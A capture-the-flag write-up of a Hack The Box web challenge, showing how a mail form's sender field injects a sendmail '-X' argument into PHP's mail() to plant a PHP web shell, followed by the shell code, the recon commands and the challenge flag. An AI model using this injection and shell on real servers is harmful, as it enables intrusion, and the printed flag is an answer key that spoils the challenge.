<style type="text/css">
  html {font-family: sans-serif;}

  pre, img, table, p {
    width: 50vw;
    margin-left: 2em;
  }

  pre {
    background: darkslategray;
    color: white;
    padding: 1em;
    white-space: pre-wrap;       /* Since CSS 2.1 */
    white-space: -moz-pre-wrap;  /* Mozilla, since 1999 */
    white-space: -pre-wrap;      /* Opera 4-6 */
    white-space: -o-pre-wrap;    /* Opera 7 */
    word-wrap: break-word;       /* Internet Explorer 5.5+ */
  }

  img {
    border: solid black 1px;
    padding: .5vw;
  }

  ol {
  	counter-reset: list;
  }

  ol > li {
  	list-style: none;
  }

  ol > li:before {
  	content: "[" counter(list) "] ";
  	counter-increment: list;
  }
</style>

<h1>Writeup "Letter Dispair"</h1>

<h2>Quick Info</h2>

<table>
	<tr><td><b>site</b></td><td>Hack the box</td></tr>
	<tr><td><b>url</b></td><td>https://app.hackthebox.com/challenges/letter-dispair</td></tr>
	<tr><td><b>discussion</b></td><td>https://forum.hackthebox.com/t/official-letter-dispair-discussion/4007</td></tr>
	<tr><td><b>type</b></td><td>challenge/web</td></tr>
	<tr><td><b>difficulty&nbsp;&nbsp;&nbsp;</b></td><td>easy</td></tr>
	<tr><td><b>startdate</b></td><td>2022-07-31</td></tr>
	<tr><td><b>enddate</b></td><td>2022-08-03</td></tr>
</table>

<h2>Description</h2>

<p>We receive an IP and port to a server. When we access the server using a web browser, we see a directory listing with three files:</p>

<img src="letter-dispair-01.png" />

<p><code>mailer.php</code> displays a form for sending e-mails:</p>

<img src="letter-dispair-02.png" />

<p><code>mailer.zip</code> contains <code>mailer.php</code> which allows us to analyse the source code.</p>

<p>A quick Google search tells us that PHP's mail() function allows remote code execution if the fifth parameter can be influenced by the user. Checking the source code reveals that the code is vulnerable. Whatever we put in the "From Email" field will be used as a parameter.</p>

<p>Following the article at [1], we enter the following string in the "From Email" field to create a publicly-accessible PHP file whose contents we can manipulate:</p>

<pre>
relations@moi.gov.htb -X/var/www/html/rce.php
</pre>

<p>Our payload will be a makeshift PHP shell, which we enter into the "Subject" field. The following line would be sufficient:</p>

<pre>
&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;
</pre>

<p>However, this is not very comfortable. We therefore improve the code to include a text field for entering commands and which formats the output:</p>

<pre>
&lt;hr /&gt;
&lt;form action=&quot;rce.php&quot; method=&quot;get&quot;&gt;
  &lt;input type=&quot;text&quot; 
    id=&quot;cmd&quot; 
    name=&quot;cmd&quot; 
    value=&#039;&lt;?php print($_GET[&quot;cmd&quot;]); ?&gt;&#039; 
    autofocus 
    onfocus=&quot;var temp_value=this.value; 
      this.value=&#039;&#039;; 
      this.value=temp_value&quot; /&gt;
&lt;/form&gt;
&lt;hr /&gt;
&lt;pre&gt;
  &lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;
&lt;/pre&gt;
&lt;hr /&gt;
</pre>

<p>After hitting the "Start Delivery" button, we reload the directory listing in order to verify that the file was created correctly. If no file is visible, we have to try different paths. In this case we are lucky on the first try:</p>

<img src="letter-dispair-03.png" />

<p>We can now open our PHP shell and start looking for the flag. Using the following commands, we are successful:</p>

<pre>
ls -la
whoami
find / -name *flag*
cat /flag.txt
</pre>

<img src="letter-dispair-04.png" />

<pre>
HTB{4_l3tt3r_0f_h0p3_c0nqu3r1ng_d1sp4ir!}
</pre>

<h2>Sources</h2>

<ol>
	<li><a href="https://www.saotn.org/exploit-phps-mail-get-remote-code-execution">https://www.saotn.org/exploit-phps-mail-get-remote-code-execution</a></li>
	<li><a href="https://www.php.net/manual/de/function.mail.php">https://www.php.net/manual/de/function.mail.php</a></li>
	<li><a href="https://blog.sonarsource.com/why-mail-is-dangerous-in-php/">https://blog.sonarsource.com/why-mail-is-dangerous-in-php/</a></li>
</ol>